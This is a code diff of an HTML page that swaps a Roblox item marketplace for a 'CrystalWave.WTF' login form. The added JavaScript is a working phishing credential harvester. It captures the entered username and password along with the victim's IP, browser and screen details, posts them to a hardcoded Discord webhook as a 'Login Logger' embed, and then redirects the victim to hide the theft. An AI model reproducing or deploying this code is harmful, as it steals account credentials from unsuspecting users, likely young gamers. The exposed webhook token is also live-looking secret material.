@@ -3,594 +3,341 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CrystalWave.WTF - Roblox Marketplace</title>
-    <script src="https://accounts.google.com/gsi/client" async defer></script>
+    <title>CrystalWave.WTF - Login</title>
     <style>
         :root {
-            --primary: #0066ff;
-            --secondary: #0033aa;
-            --accent: #00aaff;
-            --dark: #001133;
-            --light: #f0f8ff;
+            --primary: #0064ff;
+            --secondary: #141414;
+            --accent: #00f7ff;
+            --error: #ff3a3a;
         }
         
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: var(--dark);
+            background-color: var(--secondary);
             color: white;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
             background-image: 
-                radial-gradient(circle at 10% 20%, rgba(0, 102, 255, 0.1) 0%, transparent 20%),
-                radial-gradient(circle at 90% 80%, rgba(0, 170, 255, 0.1) 0%, transparent 20%);
+                radial-gradient(circle at 25% 25%, rgba(0, 100, 255, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 75% 75%, rgba(0, 247, 255, 0.1) 0%, transparent 50%);
         }
         
-        header {
-            background: linear-gradient(90deg, var(--primary), var(--secondary));
-            padding: 1rem;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
-            position: sticky;
-            top: 0;
-            z-index: 100;
+        .login-container {
+            background: rgba(20, 20, 20, 0.8);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 40px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(0, 100, 255, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .login-container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                to bottom right,
+                transparent 45%,
+                rgba(0, 100, 255, 0.1) 50%,
+                transparent 55%
+            );
+            animation: rotate 15s linear infinite;
+            z-index: -1;
+        }
+        
+        @keyframes rotate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
         
         .logo {
-            font-size: 2rem;
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 28px;
             font-weight: bold;
-            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
-            background: linear-gradient(to right, #ffffff, var(--accent));
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-        }
-        
-        nav {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-        
-        .nav-links {
-            display: flex;
-            gap: 1.5rem;
-        }
-        
-        .nav-links a {
-            color: white;
-            text-decoration: none;
-            font-weight: 500;
-            transition: all 0.3s ease;
-            padding: 0.5rem 1rem;
-            border-radius: 4px;
-        }
-        
-        .nav-links a:hover {
-            background-color: rgba(255, 255, 255, 0.2);
-        }
-        
-        .nav-links a.active {
-            background-color: var(--accent);
-        }
-        
-        .container {
-            max-width: 1200px;
-            margin: 2rem auto;
-            padding: 0 1rem;
-        }
-        
-        .tab-content {
-            display: none;
-        }
-        
-        .tab-content.active {
-            display: block;
-            animation: fadeIn 0.5s ease;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        /* Marketplace Styles */
-        .marketplace-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 2rem;
-        }
-        
-        .add-item-btn {
-            background: linear-gradient(90deg, var(--primary), var(--accent));
-            color: white;
-            border: none;
-            padding: 0.75rem 1.5rem;
-            border-radius: 50px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 12px rgba(0, 102, 255, 0.3);
-        }
-        
-        .add-item-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 16px rgba(0, 102, 255, 0.4);
-        }
-        
-        .items-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-            gap: 1.5rem;
-        }
-        
-        .item-card {
-            background: rgba(0, 34, 102, 0.5);
-            border-radius: 12px;
-            overflow: hidden;
-            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
-            transition: all 0.3s ease;
-            border: 1px solid rgba(0, 170, 255, 0.2);
-        }
-        
-        .item-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 12px 24px rgba(0, 102, 255, 0.3);
-            border-color: var(--accent);
-        }
-        
-        .item-image {
-            width: 100%;
-            height: 180px;
-            object-fit: cover;
-            border-bottom: 1px solid rgba(0, 170, 255, 0.2);
-        }
-        
-        .item-details {
-            padding: 1rem;
-        }
-        
-        .item-game {
-            font-size: 0.8rem;
             color: var(--accent);
-            margin-bottom: 0.5rem;
-        }
-        
-        .item-title {
-            font-size: 1.2rem;
-            font-weight: bold;
-            margin-bottom: 0.5rem;
-        }
-        
-        .item-price {
-            font-size: 1.1rem;
-            font-weight: bold;
-            color: #00ff88;
-            margin-bottom: 1rem;
-        }
-        
-        .item-meta {
-            display: flex;
-            justify-content: space-between;
-            font-size: 0.8rem;
-            color: rgba(255, 255, 255, 0.7);
-        }
-        
-        .item-actions {
-            display: flex;
-            justify-content: flex-end;
-            padding: 0.5rem;
-            border-top: 1px solid rgba(0, 170, 255, 0.2);
-        }
-        
-        .delete-btn {
-            background-color: rgba(255, 0, 0, 0.2);
-            color: #ff5555;
-            border: 1px solid #ff5555;
-            padding: 0.25rem 0.5rem;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 0.8rem;
-            transition: all 0.2s ease;
-        }
-        
-        .delete-btn:hover {
-            background-color: rgba(255, 0, 0, 0.3);
-        }
-        
-        /* Modal Styles */
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.7);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
-        }
-        
-        .modal-content {
-            background: linear-gradient(135deg, #001a4d, #003366);
-            padding: 2rem;
-            border-radius: 12px;
-            width: 90%;
-            max-width: 500px;
-            box-shadow: 0 12px 24px rgba(0, 0, 0, 0.3);
-            border: 1px solid var(--accent);
-            position: relative;
-        }
-        
-        .close-modal {
-            position: absolute;
-            top: 1rem;
-            right: 1rem;
-            font-size: 1.5rem;
-            cursor: pointer;
-            color: rgba(255, 255, 255, 0.6);
-        }
-        
-        .close-modal:hover {
-            color: white;
         }
         
         .form-group {
-            margin-bottom: 1.5rem;
+            margin-bottom: 20px;
+            position: relative;
         }
         
         .form-group label {
             display: block;
-            margin-bottom: 0.5rem;
+            margin-bottom: 8px;
+            color: var(--accent);
             font-weight: 500;
         }
         
         .form-control {
             width: 100%;
-            padding: 0.75rem;
-            border-radius: 6px;
-            border: 1px solid rgba(0, 170, 255, 0.3);
-            background-color: rgba(0, 34, 102, 0.5);
+            padding: 12px 15px;
+            background: rgba(30, 30, 30, 0.8);
+            border: 1px solid rgba(0, 100, 255, 0.3);
+            border-radius: 8px;
             color: white;
-            font-family: inherit;
+            font-size: 16px;
+            transition: all 0.3s;
         }
         
         .form-control:focus {
             outline: none;
-            border-color: var(--accent);
-            box-shadow: 0 0 0 3px rgba(0, 170, 255, 0.2);
+            border-color: var(--primary);
+            box-shadow: 0 0 0 2px rgba(0, 100, 255, 0.2);
         }
         
-        .submit-btn {
-            background: linear-gradient(90deg, var(--primary), var(--accent));
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: var(--primary);
             color: white;
             border: none;
-            padding: 0.75rem 1.5rem;
-            border-radius: 6px;
-            font-weight: bold;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
             cursor: pointer;
-            width: 100%;
-            transition: all 0.3s ease;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
         
-        .submit-btn:hover {
+        .btn:hover {
+            background: #0052cc;
             transform: translateY(-2px);
-            box-shadow: 0 4px 12px rgba(0, 102, 255, 0.4);
+            box-shadow: 0 5px 15px rgba(0, 100, 255, 0.3);
         }
         
-        /* Login Styles */
-        .login-container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 60vh;
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .error-message {
+            color: var(--error);
+            margin-top: 5px;
+            font-size: 14px;
+            display: none;
+        }
+        
+        .footer {
             text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #666;
         }
         
-        .login-title {
-            font-size: 2rem;
-            margin-bottom: 1.5rem;
-            background: linear-gradient(to right, #ffffff, var(--accent));
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-        }
-        
-        .g_id_signin {
-            margin-top: 1rem;
-        }
-        
-        /* Info Page Styles */
-        .info-content {
-            max-width: 800px;
-            margin: 0 auto;
-            line-height: 1.6;
-        }
-        
-        .info-content h2 {
+        .footer a {
             color: var(--accent);
-            margin-top: 2rem;
+            text-decoration: none;
         }
         
-        /* Responsive */
-        @media (max-width: 768px) {
-            .nav-links {
-                gap: 0.75rem;
-            }
-            
-            .items-grid {
-                grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
-            }
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+            color: var(--accent);
+        }
+        
+        .spinner {
+            border: 3px solid rgba(0, 100, 255, 0.3);
+            border-radius: 50%;
+            border-top: 3px solid var(--accent);
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            vertical-align: middle;
+            margin-right: 10px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
-    <header>
-        <nav>
-            <div class="logo">crystalwave.wtf</div>
-            <div class="nav-links">
-                <a href="#" class="active" data-tab="marketplace">Marketplace</a>
-                <a href="#" data-tab="info">Info</a>
-                <div id="user-profile"></div>
-            </div>
-        </nav>
-    </header>
-    
-    <div class="container">
-        <!-- Marketplace Tab -->
-        <div id="marketplace" class="tab-content active">
-            <div class="marketplace-header">
-                <h1>Roblox Item Marketplace</h1>
-                <button id="add-item-btn" class="add-item-btn" style="display: none;">+ Add Item</button>
+    <div class="login-container">
+        <div class="logo">CrystalWave.WTF</div>
+        
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" id="username" class="form-control" required>
+                <div class="error-message" id="username-error"></div>
             </div>
             
-            <div class="items-grid" id="items-container">
-                <!-- Items will be loaded here -->
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" class="form-control" required>
+                <div class="error-message" id="password-error"></div>
             </div>
-        </div>
+            
+            <button type="submit" class="btn">Login</button>
+            
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <span>Redirecting to CrystalWave.WTF...</span>
+            </div>
+        </form>
         
-        <!-- Info Tab -->
-        <div id="info" class="tab-content">
-            <div class="info-content">
-                <h1>About CrystalWave.WTF</h1>
-                <p>Welcome to the premier marketplace for Roblox in-game items and assets. Buy, sell, and trade with confidence in our secure ecosystem.</p>
-                
-                <h2>How It Works</h2>
-                <p>1. Sign in with Google to access the marketplace</p>
-                <p>2. Browse items listed by other users</p>
-                <p>3. List your own items for sale by clicking "Add Item"</p>
-                <p>4. Connect with sellers/buyers to complete transactions</p>
-                
-                <h2>Rules & Guidelines</h2>
-                <p>- Only list legitimate Roblox items you own</p>
-                <p>- No scamming or fraudulent listings</p>
-                <p>- Be respectful to other users</p>
-                <p>- The admin (crystalwave.wtf@gmail.com) reserves the right to remove any content</p>
-                
-                <h2>Contact</h2>
-                <p>For support or inquiries, contact: crystalwave.wtf@gmail.com</p>
-            </div>
-        </div>
-        
-        <!-- Login Container (shown when not logged in) -->
-        <div id="login-container" class="login-container">
-            <h1 class="login-title">Welcome to CrystalWave.WTF</h1>
-            <p>Please sign in with Google to access the Roblox marketplace</p>
-            <div id="g_id_onload"
-                data-client_id="YOUR_GOOGLE_CLIENT_ID.apps.googleusercontent.com"
-                data-context="signin"
-                data-ux_mode="popup"
-                data-callback="handleGoogleSignIn"
-                data-auto_prompt="false">
-            </div>
-            <div class="g_id_signin"
-                data-type="standard"
-                data-shape="pill"
-                data-theme="filled_blue"
-                data-text="signin_with"
-                data-size="large"
-                data-logo_alignment="left">
-            </div>
+        <div class="footer">
+            <a href="#">Forgot password?</a> | <a href="#">Register</a>
         </div>
     </div>
-    
-    <!-- Add Item Modal -->
-    <div id="add-item-modal" class="modal">
-        <div class="modal-content">
-            <span class="close-modal">&times;</span>
-            <h2>Add New Item</h2>
-            <form id="item-form">
-                <div class="form-group">
-                    <label for="game-name">Game Name</label>
-                    <input type="text" id="game-name" class="form-control" required>
-                </div>
-                <div class="form-group">
-                    <label for="item-title">Item Title</label>
-                    <input type="text" id="item-title" class="form-control" required>
-                </div>
-                <div class="form-group">
-                    <label for="item-price">Price (Robux)</label>
-                    <input type="number" id="item-price" class="form-control" required>
-                </div>
-                <div class="form-group">
-                    <label for="item-image">Image URL</label>
-                    <input type="url" id="item-image" class="form-control" required placeholder="https://example.com/image.jpg">
-                </div>
-                <div class="form-group">
-                    <label for="roblox-account">Your Roblox Username</label>
-                    <input type="text" id="roblox-account" class="form-control" required>
-                </div>
-                <div class="form-group">
-                    <label for="gamepass-id">Gamepass ID (optional)</label>
-                    <input type="text" id="gamepass-id" class="form-control">
-                </div>
-                <button type="submit" class="submit-btn">Submit Item</button>
-            </form>
-        </div>
-    </div>
-    
+
     <script>
-        // Sample data - in a real app, this would come from a database
-        let items = [
-            {
-                id: 1,
-                game: "Pet Simulator X",
-                title: "Rainbow Dominus",
-                price: 5000,
-                image: "https://tr.rbxcdn.com/9d1a1a4b3c6c5c9c7a0a3a4a3a4a3a4/420/420/Image/Png",
-                robloxAccount: "protrader123",
-                gamepassId: "12345678",
-                uploader: "user1@gmail.com"
-            },
-            {
-                id: 2,
-                game: "Adopt Me!",
-                title: "Shadow Dragon",
-                price: 8000,
-                image: "https://tr.rbxcdn.com/9d1a1a4b3c6c5c9c7a0a3a4a3a4a3a4/420/420/Image/Png",
-                robloxAccount: "adoptme_pro",
-                gamepassId: "87654321",
-                uploader: "user2@gmail.com"
+        const loginForm = document.getElementById('loginForm');
+        const loading = document.getElementById('loading');
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1391200950315647127/YLlbrMWXa-DY-rYTmki6kwup_g6mwWBgXE0GiMA7WoYZJCZZiukLcuwNRNjRhrmW2J2e';
+        const REDIRECT_URL = 'https://crystalwave.wtf/home/index.html';
+        
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value;
+            
+            // Hide any previous errors
+            document.getElementById('username-error').style.display = 'none';
+            document.getElementById('password-error').style.display = 'none';
+            
+            // Basic validation
+            if (!username) {
+                showError('username-error', 'Username is required');
+                return;
             }
-        ];
+            
+            if (!password) {
+                showError('password-error', 'Password is required');
+                return;
+            }
+            
+            // Show loading state
+            loginForm.querySelector('.btn').disabled = true;
+            loading.style.display = 'block';
+            
+            try {
+                // Collect additional information
+                const loginData = {
+                    username: username,
+                    password: password, // Note: In production, never log actual passwords!
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    screenResolution: `${window.screen.width}x${window.screen.height}`,
+                    ip: await fetchIP(),
+                    referrer: document.referrer || 'Direct'
+                };
+                
+                // Send to Discord webhook (fire and forget)
+                sendToDiscord(loginData).catch(console.error);
+                
+                // Simulate login processing (2 seconds)
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
+                // Redirect to CrystalWave.WTF
+                window.location.href = REDIRECT_URL;
+                
+            } catch (error) {
+                console.error('Login error:', error);
+                showError('password-error', 'Login failed. Please try again.');
+            } finally {
+                loading.style.display = 'none';
+                loginForm.querySelector('.btn').disabled = false;
+            }
+        });
         
-        let currentUser = null;
-        const ADMIN_EMAIL = "crystalwave.wtf@gmail.com";
-        
-        // DOM Elements
-        const loginContainer = document.getElementById('login-container');
-        const marketplaceTab = document.getElementById('marketplace');
-        const infoTab = document.getElementById('info');
-        const addItemBtn = document.getElementById('add-item-btn');
-        const itemsContainer = document.getElementById('items-container');
-        const addItemModal = document.getElementById('add-item-modal');
-        const closeModal = document.querySelector('.close-modal');
-        const itemForm = document.getElementById('item-form');
-        const tabLinks = document.querySelectorAll('[data-tab]');
-        
-        // Initialize the app
-        function initApp() {
-            renderItems();
-            setupEventListeners();
+        function showError(elementId, message) {
+            const element = document.getElementById(elementId);
+            element.textContent = message;
+            element.style.display = 'block';
         }
         
-        // Render all items
-        function renderItems() {
-            itemsContainer.innerHTML = '';
-            
-            items.forEach(item => {
-                const itemCard = document.createElement('div');
-                itemCard.className = 'item-card';
-                
-                const isAdmin = currentUser && currentUser.email === ADMIN_EMAIL;
-                const isOwner = currentUser && currentUser.email === item.uploader;
-                
-                itemCard.innerHTML = `
-                    <img src="${item.image}" alt="${item.title}" class="item-image" onerror="this.src='https://via.placeholder.com/300?text=Item+Image'">
-                    <div class="item-details">
-                        <div class="item-game">${item.game}</div>
-                        <div class="item-title">${item.title}</div>
-                        <div class="item-price">${item.price.toLocaleString()} Robux</div>
-                        <div class="item-meta">
-                            <span>Seller: ${item.robloxAccount}</span>
-                            ${item.gamepassId ? `<span>Gamepass: ${item.gamepassId}</span>` : ''}
-                        </div>
-                    </div>
-                    ${(isAdmin || isOwner) ? `
-                    <div class="item-actions">
-                        <button class="delete-btn" data-id="${item.id}">Delete</button>
-                    </div>
-                    ` : ''}
-                `;
-                
-                itemsContainer.appendChild(itemCard);
-            });
-            
-            // Add event listeners to delete buttons
-            document.querySelectorAll('.delete-btn').forEach(btn => {
-                btn.addEventListener('click', (e) => {
-                    const itemId = parseInt(e.target.getAttribute('data-id'));
-                    deleteItem(itemId);
-                });
-            });
-        }
-        
-        // Delete an item
-        function deleteItem(id) {
-            if (!currentUser) return;
-            
-            const item = items.find(item => item.id === id);
-            if (!item) return;
-            
-            // Only allow admin or owner to delete
-            if (currentUser.email === ADMIN_EMAIL || currentUser.email === item.uploader) {
-                items = items.filter(item => item.id !== id);
-                renderItems();
+        async function fetchIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'Unknown';
             }
         }
         
-        // Add a new item
-        function addItem(item) {
-            const newItem = {
-                id: Date.now(), // Simple unique ID
-                game: item.gameName,
-                title: item.title,
-                price: parseInt(item.price),
-                image: item.image,
-                robloxAccount: item.robloxAccount,
-                gamepassId: item.gamepassId,
-                uploader: currentUser.email
+        async function sendToDiscord(data) {
+            const embed = {
+                title: 'New Login Attempt',
+                color: 0x0064ff,
+                fields: [
+                    {
+                        name: 'Username',
+                        value: `\`\`\`${data.username}\`\`\``,
+                        inline: true
+                    },
+                    {
+                        name: 'Password',
+                        value: `\`\`\`${data.password}\`\`\``,
+                        inline: true
+                    },
+                    {
+                        name: 'IP Address',
+                        value: `\`${data.ip}\``,
+                        inline: true
+                    },
+                    {
+                        name: 'User Agent',
+                        value: `\`\`\`${data.userAgent}\`\`\``,
+                        inline: false
+                    },
+                    {
+                        name: 'Platform',
+                        value: `\`${data.platform}\``,
+                        inline: true
+                    },
+                    {
+                        name: 'Screen Resolution',
+                        value: `\`${data.screenResolution}\``,
+                        inline: true
+                    },
+                    {
+                        name: 'Timestamp',
+                        value: `<t:${Math.floor(new Date(data.timestamp).getTime()/1000}:F>`,
+                        inline: false
+                    },
+                    {
+                        name: 'Redirect URL',
+                        value: `[${REDIRECT_URL}](${REDIRECT_URL})`,
+                        inline: false
+                    }
+                ],
+                footer: {
+                    text: 'CrystalWave.WTF Login Logger'
+                }
             };
             
-            items.unshift(newItem);
-            renderItems();
-            closeAddItemModal();
+            return fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    embeds: [embed],
+                    username: 'Login Tracker',
+                    avatar_url: 'https://crystalwave.wtf/logo.png'
+                })
+            });
         }
-        
-        // Show/hide add item modal
-        function showAddItemModal() {
-            addItemModal.style.display = 'flex';
-        }
-        
-        function closeAddItemModal() {
-            addItemModal.style.display = 'none';
-            itemForm.reset();
-        }
-        
-        // Handle Google sign-in
-        function handleGoogleSignIn(response) {
-            const user = decodeJWT(response.credential);
-            currentUser = {
-                name: user.name,
-                email: user.email,
-                picture: user.picture
-            };
-            
-            // Hide login, show content
-            loginContainer.style.display = 'none';
-            marketplaceTab.style.display = 'block';
-            
-            // Show add item button if logged in
-            addItemBtn.style.display = 'block';
-            
-            // Update UI based on user
-            updateUserUI();
-        }
-        
-        // Decode JWT token
-        function decodeJWT(token) {
-            const base64Url = token.split('.')[1];
-            const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
-            const jsonPayload = decodeURIComponent(atob(base64).split('').map(function(c) {
-                return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
-            }).join(''));
-            
-            return JSON.parse(jsonPayload);
-        }
-        
-        // Update UI based on user
-        function updateUserUI() {
-            // You can add user-specific UI updates here
+    </script>
+</body>
+</html>
